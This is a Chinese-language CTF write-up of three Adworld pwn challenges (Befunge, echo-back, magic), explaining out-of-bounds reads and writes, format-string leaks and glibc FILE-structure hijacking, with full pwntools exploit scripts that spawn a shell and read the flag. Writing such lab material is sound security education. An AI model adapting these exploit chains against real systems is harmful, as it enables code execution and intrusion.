# 攻防世界PWN进阶区 部分题解


好不容易打进rank3，随手记录一下近期做过的三道比较繁琐的高分题吧

![](https://i.loli.net/2021/08/27/qordcXaAhGM7EWg.png)

<!--more-->

## Befunge

### 漏洞解析

8分题，是一道比较有意思的虚拟机pwn。该程序模拟了一个**Befunge**语言的解释器

<!-- more -->

> Befunge的代码是二维的。它用 < > v ^ 这四个符号来控制一个指针在代码中移动，指针经过一个字符或数字则把它压入一个栈，四则运算符号的功能就是弹出栈顶两个元素进行计算后把结果压回去。用 _ 和 | 来表示有条件的方向选择：当栈顶元素为0时向右（上）走，否则向左（下）走。& 和 ~ 分别用于读入数字或字符并压入栈，句号和逗号分别表示将栈顶元素作为整数或字符输出。最后以一个@符号表示程序结束。

保护全开，根据提示是一个Befunge93解释器，查阅一些资料（[1], [2],[3]）

```bash
# pwn @ ubuntu in /mnt/hgfs/adworld [3:39:33] C:1
$ ./interpreter-200
Welcome to Online Befunge(93) Interpreter
Please input your program.
>
```

耐心逆一下可以发现确实如此，`program[2000]`按二维组织成$25*80$。

代码上下左右移动靠下面的跳转表实现。

```bash
.rodata:00000000000014E0 ; _DWORD dword_14E0[4]
.rodata:00000000000014E0 dword_14E0      dd 0, 1, 0, 0FFFFFFFFh  ; DATA XREF: main+520↑o
.rodata:00000000000014F0 ; _DWORD dword_14F0[4]
.rodata:00000000000014F0 dword_14F0      dd 1, 0, 0FFFFFFFFh, 0  ; DATA XREF: main+536↑o
```

每次读取代码后依据方向改变下一次读取位置，其中x为行数，y为列数，就像走迷宫一样。

```c
/*执行方向	0-右	1-下	2-左	3-上	*/
prog_x += dword_14E0[direction];
v30 = prog_y + dword_14F0[direction];
prog_y += dword_14F0[direction];
if ( prog_x == -1 )                         // 25*80的program矩阵
{
    prog_x = 24;
}
else if ( prog_x == 25 )
{
    prog_x = 0;
}
if ( v30 == -1 )
{
    prog_y = 79;
}
else if ( prog_y == 80 )
{
    prog_y = 0;
}
```

注意到program数组是`char`，stack数组是`QWARD`，所以pop和push都是`int64`类型，所以漏洞点也比较明显，在主函数中g与p都能越界，这样便可以任意地址读写，布置rop链即可。

```c
case 'g':
    v26 = pop();
    v27 = pop();
    push(program[80 * v26 + v27]);
    break;
case 'p':
    v28 = pop();
    v29 = pop();
    program[80 * v28 + v29] = pop();
    break;
```

这里我们需要泄露很多东西，got表里有`puts_ptr`和`program_ptr`，我们可以泄露`elf_base`和`libc_base`，由于要布置ROP链，也需要拿到一个栈指针，这里也是先拿到libc地址，然后用`environ`变量拿到栈指针。

### 漏洞利用

总体来说在进阶区里还是算比较难的题，逆向和漏洞利用工作量都不小。exp如下

```python
from pwn import *
context(arch = 'amd64', os = 'linux', endian = 'little')
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

io = process("./interpreter-200")

#io = remote("220.249.52.134",33610)
#gdb.attach(io,"b *0xE05+0x555555554000")

# 0x202040 -> 0x201F50

gdb.attach(io,"b *0x1203+0x555555554000")

program = "&&g,&&g,&&g,&&g,&&g,&&g,"  # leak puts_addr 

program += "&&g,&&g,&&g,&&g,&&g,&&g," #leak elf_addr 

program = program.ljust(79, " ") + "v\n"
program += "v" + " "*78 + "<\n" 

program += ">&&&*&+g,&&&*&+g,&&&*&+g,&&&*&+g,&&&*&+g,&&&*&+g,".ljust(79, " ") + "v\n"# leak stack_addr
program += "v" + " "*78 + "<\n" 

program += (">" + "&&&&*&+p"*8).ljust(79, " ") + 'v\n'   # ROP exploit
program += "v" + " "*78 + "<\n" 
program += (">" + "&&&&*&+p"*8).ljust(79," ") + 'v\n'
program += "v" + " "*78 + "<\n" 
program += ">" + "&&&&*&+p"*8 + '><'

io.sendline(program.ljust(2000,'@'))

for i in range(6):
  io.sendline(str(i))
  io.sendline("-3")

#for i in range(6):
#  io.sendline(str(i+0x28))
#  io.sendline("-3")

for i in range(-16, -10):
  io.sendline(str(i))
  io.sendline("-1")


io.recvuntil("> > > > > > > > > > > > > > > > > > > > > > > > > ")

puts_addr = u64(io.recv(6)+'\x00\x00')
#fgets_addr = u64(io.recv(6)+'\x00\x00')
#success(len(io.recv(6)))
progbuf_addr = u64(io.recv(6)+'\x00\x00')

libc_base = puts_addr - 0x6F690
environ = libc_base + 0x3c6f38
elf_base = progbuf_addr - 0x202040

success(hex(elf_base))
success(hex(environ))
success(hex(libc_base))

#raw_input()

x = (environ - elf_base - 0x202040) / 80
y =  (environ - elf_base - 0x202040) % 80

x_1 = x / 50000
x_2 = x % 50000

for i in range(6):
  io.sendline(str(y+i))
  io.sendline(str(x_1))
  io.sendline(str(50000))
  io.sendline(str(x_2))

stack_addr = ''
for i in range(6):
  stack_addr += io.recv(1)
stack_addr = u64(stack_addr+'\x00\x00')
success(hex(stack_addr))
rop_target = stack_addr - 0x128 + 0x38
raw_input()

offset = rop_target - progbuf_addr
prdir = 0x120c + elf_base
binsh_addr = libc_base + 0x18cd57 
system_addr = libc_base + 0x045390

context.log_level = 'info'

# write(progbuf_addr + offset, value, 8)
def edit(offset, value):
  x = offset / 80
  y = offset % 80
  x_1 = x / 50000
  x_2 = x % 50000
  success(x_1)
  success(x_2)
  success(y)
  success(hex(value))
  for i in range(8):
    val = value & 0xff
    value = value >> 8
    success("round{}: val:{} | y:{} | x_1:{} | x_2:{} | write at:{}".format(i, hex(val), y+i, x_1, x_2, hex((x_1*50000+x_2)*80+y+i+progbuf_addr)))
    io.sendline(str(val))
    io.sendline(str(y+i))
    io.sendline(str(x_1))
    io.sendline(str(50000))
    io.sendline(str(x_2))

edit(offset, prdir)
edit(offset+8, binsh_addr)
edit(offset+16, system_addr)

io.interactive()
```

成功与服务器交互

```bash
[+] 11470264
[+] 27054
[+] 56
[+] 0x56434fd4f20c
[+] round0: val:0xc | y:56 | x_1:11470264 | x_2:27054 | write at:0x7ffdd4217ed8
[+] round1: val:0xf2 | y:57 | x_1:11470264 | x_2:27054 | write at:0x7ffdd4217ed9
[+] round2: val:0xd4 | y:58 | x_1:11470264 | x_2:27054 | write at:0x7ffdd4217eda
[+] round3: val:0x4f | y:59 | x_1:11470264 | x_2:27054 | write at:0x7ffdd4217edb
[+] round4: val:0x43 | y:60 | x_1:11470264 | x_2:27054 | write at:0x7ffdd4217edc
[+] round5: val:0x56 | y:61 | x_1:11470264 | x_2:27054 | write at:0x7ffdd4217edd
[+] round6: val:0x0 | y:62 | x_1:11470264 | x_2:27054 | write at:0x7ffdd4217ede
[+] round7: val:0x0 | y:63 | x_1:11470264 | x_2:27054 | write at:0x7ffdd4217edf
[+] 11470264
[+] 27054
[+] 64
[+] 0x7f9040bcfd57
[+] round0: val:0x57 | y:64 | x_1:11470264 | x_2:27054 | write at:0x7ffdd4217ee0
[+] round1: val:0xfd | y:65 | x_1:11470264 | x_2:27054 | write at:0x7ffdd4217ee1
[+] round2: val:0xbc | y:66 | x_1:11470264 | x_2:27054 | write at:0x7ffdd4217ee2
[+] round3: val:0x40 | y:67 | x_1:11470264 | x_2:27054 | write at:0x7ffdd4217ee3
[+] round4: val:0x90 | y:68 | x_1:11470264 | x_2:27054 | write at:0x7ffdd4217ee4
[+] round5: val:0x7f | y:69 | x_1:11470264 | x_2:27054 | write at:0x7ffdd4217ee5
[+] round6: val:0x0 | y:70 | x_1:11470264 | x_2:27054 | write at:0x7ffdd4217ee6
[+] round7: val:0x0 | y:71 | x_1:11470264 | x_2:27054 | write at:0x7ffdd4217ee7
[+] 11470264
[+] 27054
[+] 72
[+] 0x7f9040a88390
[+] round0: val:0x90 | y:72 | x_1:11470264 | x_2:27054 | write at:0x7ffdd4217ee8
[+] round1: val:0x83 | y:73 | x_1:11470264 | x_2:27054 | write at:0x7ffdd4217ee9
[+] round2: val:0xa8 | y:74 | x_1:11470264 | x_2:27054 | write at:0x7ffdd4217eea
[+] round3: val:0x40 | y:75 | x_1:11470264 | x_2:27054 | write at:0x7ffdd4217eeb
[+] round4: val:0x90 | y:76 | x_1:11470264 | x_2:27054 | write at:0x7ffdd4217eec
[+] round5: val:0x7f | y:77 | x_1:11470264 | x_2:27054 | write at:0x7ffdd4217eed
[+] round6: val:0x0 | y:78 | x_1:11470264 | x_2:27054 | write at:0x7ffdd4217eee
[+] round7: val:0x0 | y:79 | x_1:11470264 | x_2:27054 | write at:0x7ffdd4217eef
[*] Switching to interactive mode
Too many steps. Is there any infinite loops?
$ ls
befunge
bin
dev
flag
lib
lib32
lib64
$ cat flag
cyberpeace{98a98f0ba1ad006fb670b684a2c0c129}
Time out
[*] Got EOF while reading in interactive
$ 
```

### 参考资料

[1] http://www.matrix67.com/blog/archives/253

[2] https://www.jianshu.com/p/ed929cf72312

[3] http://quadium.net/funge/spec98.html


## echo-back

### checksec

64位程序，保护全开，无法修改got表

###  漏洞

![20200414205804.png](https://i.loli.net/2020/04/15/ctDxfSMpTl3jIdy.png)

在上图函数中有明显的格式化字符串漏洞，但允许输入的字符只有7个，连一个p64都装不下。

![20200414205921.png](https://i.loli.net/2020/04/15/oRE75dJgyKvkeWz.png)

main函数可以一直循环，在上述两个函数中选择，目前来看`name` 并没有什么作用。

由于格式化字符串太短无法直接改写返回地址，考虑攻击scanf()绕过大小限制，再写返回地址，分为如下几步

###  获取`stdin`地址

我们知道栈上可能有某些关键地址，同时由于程序开启了PIE保护，必须利用格式化字符串先泄露libc与elf的基地址才能进一步攻击。观察echo_back函数return前栈的内容，可以发现在rsp+8偏移处有elf_base相关地址，在rsp+13编译处有libc_base相关地址，现在需要通过调试把找到具体的位置，把它们泄露出来

![20200414205959.png](https://i.loli.net/2020/04/15/765toHBTSRFCjDE.png)

根据调试，分别输入*%14$p* 与*%19$p* 可以得到。当然其实我们还需要泄露一个返回地址<font color=red>所在位置</font>，以便最后为了改写。注意，<font color=red>因为我们能泄露的是地址的内容而不是地址</font>，所以这里我们只能选择泄露rbp内容，[rbp]+8处存放main函数返回地址。可以输入*%12$p* 得到。从而得到stdin地址。

### 攻击`stdin`结构

由scanf()源码可知，它通过stdin的FILE结构暂存输入流，然后输入到指定位置。下面是scanf()的核心实现函数_IO_new_file_underflow()源码：

```c
int _IO_new_file_underflow (_IO_FILE *fp)
{
  _IO_ssize_t count;
#if 0
  /* SysV does not make this test; take it out for compatibility */
  if (fp->_flags & _IO_EOF_SEEN)
    return (EOF);
#endif

  if (fp->_flags & _IO_NO_READS)
    {
      fp->_flags |= _IO_ERR_SEEN;
      __set_errno (EBADF);
      return EOF;
    }
  /*!!!!!*/
  if (fp->_IO_read_ptr < fp->_IO_read_end)              
    return *(unsigned char *) fp->_IO_read_ptr;        
  if (fp->_IO_buf_base == NULL)
    {
      /* Maybe we already have a push back pointer.  */
      if (fp->_IO_save_base != NULL)
    {
      free (fp->_IO_save_base);
      fp->_flags &= ~_IO_IN_BACKUP;
    }
      _IO_doallocbuf (fp);
    }

  /* Flush all line buffered files before reading. */
  /* FIXME This can/should be moved to genops ?? */
  if (fp->_flags & (_IO_LINE_BUF|_IO_UNBUFFERED))
    {
#if 0
      _IO_flush_all_linebuffered ();
#else
      /* We used to flush all line-buffered stream.  This really isn't
     required by any standard.  My recollection is that
     traditional Unix systems did this for stdout.  stderr better
     not be line buffered.  So we do just that here
     explicitly.  --drepper */
      _IO_acquire_lock (_IO_stdout);

      if ((_IO_stdout->_flags & (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF))
      == (_IO_LINKED | _IO_LINE_BUF))
    _IO_OVERFLOW (_IO_stdout, EOF);

      _IO_release_lock (_IO_stdout);
#endif
    }

  _IO_switch_to_get_mode (fp);

  /* This is very tricky. We have to adjust those
     pointers before we call _IO_SYSREAD () since
     we may longjump () out while waiting for
     input. Those pointers may be screwed up. H.J. */
  fp->_IO_read_base = fp->_IO_read_ptr = fp->_IO_buf_base;
  fp->_IO_read_end = fp->_IO_buf_base;
  fp->_IO_write_base = fp->_IO_write_ptr = fp->_IO_write_end
    = fp->_IO_buf_base;
  /*!!!!!*/
  count = _IO_SYSREAD (fp, fp->_IO_buf_base,                 
               fp->_IO_buf_end - fp->_IO_buf_base);         
  if (count <= 0)
    {
      if (count == 0)
    fp->_flags |= _IO_EOF_SEEN;
      else
    fp->_flags |= _IO_ERR_SEEN, count = 0;
  }
    /*!!!!!*/
  fp->_IO_read_end += count;
  if (count == 0)
    {
      /* If a stream is read to EOF, the calling application may switch active
     handles.  As a result, our offset cache would no longer be valid, so
     unset it.  */
      fp->_offset = _IO_pos_BAD;
      return EOF;
    }
  if (fp->_offset != _IO_pos_BAD)
    _IO_pos_adjust (fp->_offset, count);
  return *(unsigned char *) fp->_IO_read_ptr;
}

```

注意其中`/*!!!!!*/`标识的三处是我们攻击FILE结构时需要注意的地方

> 当stdin->_IO_read_ptr大于等于stdin->_IO_read_end时，此函数会调用_IO_SYSREAD()在stdin->_IO_buf_base处读入stdin->_IO_buf_end - stdin->_IO_buf_base个字节，然后更新stdin->_IO_read_end的值

我们知道了`stdin`的地址后可以利用格式化字符串漏洞将`stdin`的FILE的`IO_buf_base`修改为main函数的返回值所在地址，即可以实现改写返回地址。但在这之前不要忘了我们只能输入7个格式化字符，我们能用这7个字符干什么呢？先调试看看吧

在`echo_back`返回之前，我们查看`stdin`的结构，可以看到`echo_back`结束后`stdin->_IO_read_ptr`是等于`stdin->_IO_read_end`的，在下次执行`echo_back`之前我们希望能修改`stdin->_IO_buf_base`的值。这里我们想到通过格式化字符串写`stdin->_IO_buf_base`，但由于字数限制又不能直接写成main函数的返回地址处。

![20200414210039.png](https://i.loli.net/2020/04/15/VKjCf4HpwyT25FY.png)

观察FILE地址：`0x7fb99cd198e0 <_IO_2_1_stdin_>` ，我们想到将`stdin->_IO_buf_base`低字节写成`\x00` ，这样我们可以控制从`0x7fb99cd19900` 到`0x7fb99cd19964` 的所有地址，而FILE结构的很多部分也就在这个范围内，包括`stdin->_IO_buf_base`与`stdin->_IO_buf_end`！这样我们便可以为所欲为了。但是我们怎么利用格式化字符串能写`stdin->_IO_buf_base`呢？这时想起了函数`name`，它写入的参数就`echo_back`中`a1`。所以我们在`a1`中输入`p64(stdin->_IO_buf_base)`，并在`echo_back`中键入格式化字符串修改，调试得`a1`对应位置为`%16$p` ，故输入`%16$hhn` 即可修改。动手试试，下图为修改结果

![20200414210129.png](https://i.loli.net/2020/04/15/WNjBFmbAp5xQuHY.png)

所以我们下次输入能从`0x7fb99cd19900 ` 一直写到`0x7fb99cd19964 ` ，也能再次通过覆盖而改变`stdin->_IO_buf_base`与`stdin->_IO_buf_end`，为避免错误保持前几项不变，为`_IO_2_1_stdin_+131` 。下面将`stdin->_IO_buf_base`与`stdin->_IO_buf_end`修改为我们想要写的main函数返回地址处

![20200414210206.png](https://i.loli.net/2020/04/15/QE7DabcJR6NC4Wv.png)

![20200414210422.png](https://i.loli.net/2020/04/15/Yc4jP6xVbWdoOER.png)

改写成功！接下来我们只要再次执行到`echo_back` 中的`scanf()` 

输入`p64(pop_rdi_ret)+p64(binsh_addr)+p64(system_addr)` 就好了

但我们还是高兴得太早了，仔细看上图`stdin->_IO_read_ptr`显然已经小于`stdin->_IO_read_end`了！！所以我们根本没办法写入数据。

最后一个拦路虎通过`echo_back`中的`getchar()` 解决，`getchar()`会将`stdin->_IO_read_ptr`加一，所以再调用`echo_back` 几次（几十次，最终即可顺利读取并getshell。

### exp

`ubuntu16.04`测试成功:-)

```python
#! /usr/bin/env python
#coding:utf8
from pwn import *

local = 1
if local:
    p = process('./echo_back')
else:
    p = remote("111.198.29.45", 38784)

debug = 1
if debug:
    context.log_level = 'debug'

elf = ELF('./echo_back')
libc = ELF('./libc.so.6')
prdi = 0x0000000000000d93
main_P_addr = 0xc6c
IO_stdin = libc.symbols['_IO_2_1_stdin_']
context.terminal = ['tmux', 'splitw', '-h']
gdb.attach(p)

def echo_back(size, con):
    p.sendlineafter('choice>> ', '2')
    p.sendlineafter('length:', str(size))
    p.send(con)

def name(name):
    p.sendlineafter('choice>> ', '1')
    p.sendafter('name:', name)

def pause(p, s = 'pause'):
    return raw_input(s)

# 泄露libc基址
echo_back(7, '%19$p')
p.recvuntil('0x')
libc_s_m_addr = int(p.recvuntil('-').split('-')[0], 16) - 240
print hex(libc_s_m_addr)

offset = libc_s_m_addr - libc.symbols['__libc_start_main']
system = libc.symbols['system'] + offset
bin_sh = libc.search('/bin/sh').next() + offset
IO_stdin_addr = IO_stdin + offset
print hex(offset)
# 泄露elf基址
echo_back(7, '%14$p')
p.recvuntil('0x')
elf_base = int(p.recvuntil('-', drop=True), 16) - 0xd30
prdi = prdi + elf_base
# 泄露main返回地址
echo_back(7, '%12$p')
p.recvuntil('0x')
main_ebp = int(p.recvuntil('-', drop=True), 16)
main_ret = main_ebp + 0x8
# 修改IO_buf_base，增大输入字符数
IO_buf_base = IO_stdin_addr + 0x8 * 7
print "IO_buf_base:"+hex(IO_buf_base)
name(p64(IO_buf_base))
echo_back(7, '%16$hhn')
# 输入payload，覆盖stdinFILE结构的关键参数
payload = p64(IO_stdin_addr + 131) * 3 + p64(main_ret) + p64(main_ret + 3 * 0x8)
p.sendlineafter('choice>> ', '2')
p.sendafter('length:', payload)
p.sendline('')
# 绕过_IO_new_file_underflow中检测
for i in range(0,len(payload) - 1):
    p.sendlineafter('choice>> ', '2')
    p.sendlineafter('length:', '0')
# 实现指定位置写
pause(p)
p.sendlineafter('choice>> ', '2')
p.sendlineafter('length:', p64(prdi) + p64(bin_sh) + p64(system))
p.sendline('')
# getshell
p.sendlineafter('choice>> ', '3')
p.interactive()
```

## magic

### checksec

64位程序，只开了`NX`与`Canary`，可以劫持`got`表

### 漏洞

分析程序知`wizard`为一个结构体，先在ida中创建，便于后续分析

![](https://i.loli.net/2020/04/16/tLGv5OqzRI14orM.png)

主要函数为`wizard_spell` ，存在负下标的漏洞，并且函数先后调用了`fwrite` 与`fread` 

![](https://i.loli.net/2020/04/16/vkJajKQziZ4oyAW.png)

同时我们发现，全局变量`log_file`与`wizards`数组离得很近，所以我们可以通过负下标控制`log_file` 指向的`FILE`内容

![](https://i.loli.net/2020/04/16/jELCoPgMWyGi5xK.png)

本题主要考察`fwrite`与`fread`的源码，读函数如`fread/scanf`等 都会调用`IO_underflow` ，写函数是`IO_overflow` ，与`FILE` 相关的操作都在里面。分析源码后某大佬得出结论（不是我

> 在读操作中，我们只能修改写相关的指针，如`_IO_write_base/_IO_write_ptr` 等
>
> 而在写操作中，我们只能修改读相关指针，如`_IO_read_base/_IO_read_ptr`等

也就是说我们只能在`fwrite`中改写读的指针，在`fread`中改写写的指针。我们的思路是，修改`_IO_read_ptr`打印出`libc`基址，修改`_IO_write_ptr` 改写`atoi_got` 内容为`system` ，具体来说分为以下部分

### 修改`_IO_write_ptr`

我们发现`wizard->power`与`log_file->_IO_write_ptr`在各自结构体中的偏移相同，也就是说如果我们输入负下标`-2`，每次调用完`wizard_spell`后`log_file->_IO_write_ptr`就会减少50，很自然想到让其减少到`FILE`结构体，这样就可以任意修改`FILE`了。动手调试一下

我们先初始化一个`wizard[0]` ，以初始化`FILE` 结构体，在`wizard_spell` 返回前断下。

![](https://i.loli.net/2020/04/16/ghOtN9LTCxr8FmD.png)

简单计算一下，`656=14*50-44` ，也就是至少调用14次`wizard_spell` ，然后在这14次中应该输入44个字符串，因为每次`_IO_write_ptr` 还会加上输入的字符串数。这里经过反复调试（因为FILE前后数据段有很多重要参数，我们每次都修改了某些参数，很容易使程序崩溃），最终得到了一个不会崩溃的输入序列

```python
for i in range(11):
    spell(-2, '\x00')
spell(-2, '\x00' * 11)
spell(-2, '\x00' * 11)
spell(-2, '\x00' * 11)
```

这时`_IO_write_ptr`位于`FILE`-1的位置，调试一下确实如此，可以输入数据覆盖`FILE` 结构了

![](https://i.loli.net/2020/04/16/wgWNuqx9bvKSVyn.png)

### 泄露`libc`与`heap_base` 

紧接上文，我们可以将`FILE`的`_IO_read_ptr`的值修改为`atoi_got`，这样在下一次调用`wizard_spell` 时调用`fwrite` 会将`_IO_read_ptr`指向的值也就是`atoi` 的实际地址读入到`log_file` 中，然后通过`fread` 打印出来，泄露`libc` 。需要注意这里我们应该向`wizard[0]` 而不是`wizard[-2]`中输入payload，因为我们并不想让`_IO_write_ptr` 减少50。同时应该尽量保持其他`FILE` 数据不变。

```python
# leak libc
payload = '\x00'
payload += p64(0xfbad24a8)
spell(0,payload)
payload = p64(atoi_got) + p64(atoi_got + 0x100)
spell(0,payload)
atoi_addr = u64(p.recv(8))
print hex(atoi_addr)
```

于是我们泄露了`libc` ，此时的`_IO_write_ptr`指向了`_IO_read_base` ，也即`FILE` +24偏移处，所以我们重新利用`wizard[-2]` 来使`_IO_write_ptr`指回`FILE` 首地址，继续修改`FILE` 来泄露`heap_base` ，而`log_file` 为`FILE`指针，内容即为堆上的地址，用它来泄露`heap_base` 。

```python
# leak heap
spell(-2, '\x00' * 0x10)
spell(0, '\x00' * 10 + p64(0xfbad24a8))
spell(0, p64(log_file) + p64(log_file + 0x50))
heap = u64(p.recvn(8)) - 0x10
print 'heap:',hex(heap)
```

### 修改`atoi_got` 表项

紧接上文，我们现在的`_IO_write_ptr`指向了`_IO_read_base` 。我们下一步是想写`atoi_got` 表项为`system` ，就像上面一样很自然的思路当然是修改`_IO_write_ptr` 使其指向`atoi_got` ，但这是不行的。

回想最开始的一句话，再重复一遍予以强调。

> 在读操作中，我们只能修改写相关的指针，如`_IO_write_base/_IO_write_ptr` 等
>
> 而在写操作中，我们只能修改读相关指针，如`_IO_read_base/_IO_read_ptr`等

具体原因可以在源码中看到，当我们调用写函数并试图修改写指针，写操作完成后`_IO_write_ptr` 会再一次被覆盖，变回了原来的正常情况地址；读函数也类似。在上面的利用过程可以看到我们是利用`fwrite` 修改`_IO_read_ptr` ，所以才能成功泄露。也就是说，如果我们想改写`atoi_got` 表项，我们应该利用`fread` 改写`_IO_write_ptr` 。

#### 源码分析

<font color=red> 这里我们解释一下为什么</font>，笔者说说自己的看法，当然如果耐心看看源码可能会有新的理解，下列代码节选自`_IO_new_file_xsputn` ，也即`fwrite` 核心实现函数。

```python
...
if ((f->_flags & _IO_LINE_BUF) && (f->_flags & _IO_CURRENTLY_PUTTING))
	count = f->_IO_buf_end - f->_IO_write_ptr;
else if (f->_IO_write_end > f->_IO_write_ptr)
    count = f->_IO_write_end - f->_IO_write_ptr;
...
...
// 利用memcpy实现写，其中s为data地址
#ifdef _LIBC
        f->_IO_write_ptr = __mempcpy(f->_IO_write_ptr, s, count);
#else
        memcpy(f->_IO_write_ptr, s, count);
        f->_IO_write_ptr += count;
```

我们想想如果在`fwrite` 中想改变`_IO_write_ptr`为A会发生什么，在执行`__memcpy` 前`_IO_write_ptr`均为原值B，但是s的内容为A（我们试图改变`_IO_write_ptr`为A），在`__memcpy`的过程中`_IO_write_ptr`确实被改为A了，但不要忘了 还需要将它的返回值赋给`_IO_write_ptr`，所以`_IO_write_ptr`变回了`B+count` ，一如正常执行后的结果！至此我们明白了，为什么`fwrite` 改变`_IO_write_ptr`并不奏效。

#### 回归正题

所以怎么利用`fread` 改写`_IO_write_ptr`，然后在下一次`wizard_spell` 中就能实现指定位置写呢？这里还是要从`fread` 源码入手，它的核心实现落到了`_IO_file_xsgetn` 上，部分源码如下

```python
	...
	if (fp->_IO_read_ptr < fp->_IO_read_end)
    return *(unsigned char *)fp->_IO_read_ptr;
	...
	...
	fp->_IO_read_base = fp->_IO_read_ptr = fp->_IO_buf_base;
	fp->_IO_read_end = fp->_IO_buf_base;
	fp->_IO_write_base = fp->_IO_write_ptr = fp->_IO_write_end = fp->_IO_buf_base;
	//调用系统接口读入
    count = _IO_SYSREAD(fp, fp->_IO_buf_base,
                        fp->_IO_buf_end - fp->_IO_buf_base);
```

这里我们首先得绕过第一个判断（不然不读了），然后发现它把很多`FILE` 指针的值都变为了`_IO_buf_base `，包括 `_IO_write_ptr`。我们无法在`fwrite` 中顺利改变`_IO_write_ptr`，何不改变`_IO_buf_base `，然后在调用`fread` 后就能改变`_IO_write_ptr ` 了。尝试一下：

```python
spell(0, p64(log_file) + p64(heap + 0x200) * 3)
spell(0, p64(atoi_got) + p64(atoi_got + 0xAAA))
```

很遗憾，调试发现并没有改写成功。

我们想把`_IO_buf_base `赋值为`atoi_got` ，然后让`_IO_write_ptr ` 也变为这个值。再回头看看`fwrite` 源码不难发现，由于`_IO_write_end `也被赋值为`_IO_buf_base `，所以在`fwrite` 中`count` 为0，不会再读了！

```python
if ((f->_flags & _IO_LINE_BUF) && (f->_flags & _IO_CURRENTLY_PUTTING))
    {
        count = f->_IO_buf_end - f->_IO_write_ptr;
        ...
    }
else if (f->_IO_write_end > f->_IO_write_ptr)
        count = f->_IO_write_end - f->_IO_write_ptr; /* Space available. */

    /* Then fill the buffer. */
    if (count > 0)
    {
        if (count > to_do)
            count = to_do;
#ifdef _LIBC
        f->_IO_write_ptr = __mempcpy(f->_IO_write_ptr, s, count);
#else
        memcpy(f->_IO_write_ptr, s, count);
        f->_IO_write_ptr += count;
```

好了，所以我们最终如下操作，先把`_IO_write_end `与`_IO_write_ptr `都改为`atoi_got + 143` ，最后再利用负下标漏洞把`_IO_write_ptr `向下滑倒`atoi_got` -1，于是目的就达成了。

```python
# change atoi to system
spell(0, p64(log_file) + p64(heap + 0x200) * 3)
spell(0, p64(atoi_got + 143) + p64(atoi_got + 0xAAA))

spell(-2, '\x00')
spell(-2, '\x00' * 3)
spell(-2, '\x00' * 3)
payload = '\x00' + p64(system)
spell(0, payload)
```

### exp

ubuntu16.04测试成功

```python
#! /usr/bin/env python
from pwn import *

p = process('./magic')

debug = 1
if debug:
    context.log_level = 'debug'

elf = ELF('./magic')
atoi_got = elf.got['atoi']
log_file = elf.sym['log_file']

libc = elf.libc

def create():
    p.sendlineafter('choice>> ', '1')
    p.sendlineafter("Give me the wizard's name:", 'aaa')

def spell(index, name):
    p.sendlineafter('choice>> ', '2')
    p.sendlineafter('Who will spell:', str(index))
    p.sendafter('Spell name:', str(name))

def pause(p, s = 'pause'):
    return raw_input(s)


context.terminal = ['tmux', 'splitw', '-h']
# gdb.attach(p)
create()
spell(0, 'aaa')
#pause()



# leak libc
for i in range(11):
    spell(-2, '\x00')
spell(-2, '\x00' * 11)
spell(-2, '\x00' * 11)
spell(-2, '\x00' * 11)

payload = '\x00'
payload += p64(0xfbad24a8)
spell(0,payload)
payload = p64(atoi_got) + p64(atoi_got + 0x100)
spell(0,payload)
atoi_addr = u64(p.recv(8))
print hex(atoi_addr)

# gdb.attach(p)
offset= atoi_addr - libc.sym['atoi']
system = offset + libc.sym['system']


# leak heap
spell(-2, '\x00' * 0x10)
spell(0, '\x00' * 10 + p64(0xfbad24a8))
spell(0, p64(log_file) + p64(log_file + 0x50))

heap = u64(p.recvn(8)) - 0x10
print 'heap:',hex(heap)



# change atoi to system
spell(0, p64(log_file) + p64(heap + 0x200) * 3)
spell(0, p64(atoi_got + 143) + p64(atoi_got + 0xAAA))
print "atoi_got:"+hex(atoi_got)

spell(-2, '\x00')
spell(-2, '\x00' * 3)
spell(-2, '\x00' * 3)

payload = '\x00' + p64(system)
spell(0, payload)
p.sendlineafter('choice>> ','$0')
p.interactive()
```


